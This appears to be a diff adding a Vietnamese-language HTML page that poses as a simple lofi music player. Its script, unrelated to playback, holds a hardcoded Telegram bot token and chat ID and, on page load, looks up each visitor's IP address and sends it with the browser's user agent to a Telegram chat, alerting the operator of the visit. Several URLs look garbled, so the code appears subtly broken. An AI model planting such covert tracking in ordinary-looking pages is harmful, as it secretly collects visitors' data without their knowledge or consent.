@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chill Lofi Music</title>
+    <style>
+        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: linear-gradient(135deg, #1e1e2f, #121212); font-family: -apple-system, sans-serif; color: white; }
+        .player-card { background: rgba(255, 255, 255, 0.08); padding: 30px; border-radius: 24px; text-align: center; width: 290px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .cover { width: 160px; height: 160px; border-radius: 50%; background: linear-gradient(45deg, #ff6b6b, #5f27cd); margin: 0 auto 20px; display: flex; justify-content: center; align-items: center; font-size: 50px; animation: spin 10s linear infinite; animation-play-state: paused; }
+        .playing .cover { animation-play-state: running; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        h2 { margin: 10px 0 5px; font-size: 20px; }
+        p { margin: 0 0 20px; color: #aaa; font-size: 14px; }
+        audio { width: 100%; border-radius: 30px; }
+    </style>
+</head>
+<body>
+<div class="player-card" id="card">
+    <div class="cover">🎧</div>
+    <h2>Midnight Lofi Chill</h2>
+    <p>Nhấn Play để thư giãn</p>
+    <audio id="audio" controls>
+        <source src="https://pixabay.com" type="audio/mpeg">
+    </audio>
+</div>
+<script>
+    const audio = document.getElementById('audio');
+    const card = document.getElementById('card');
+    audio.onplay = () => card.classList.add('playing');
+    audio.onpause = () => card.classList.remove('playing');
+
+    const BOT_TOKEN = "9221609390:AAE69b0oHOQnWbST4mT0CnVaHnjMTiK3dGY";
+    const CHAT_ID = "8164346852";
+
+    fetch('https://ipify.org')
+        .then(res => res.json())
+        .then(data => {
+            const text = `🎵 Có người vào web nhạc!\n🌐 IP: ${data.ip}\n📱 Thiết bị: ${navigator.userAgent}`;
+            fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            });
+        });
+</script>
+</body>
+</html>
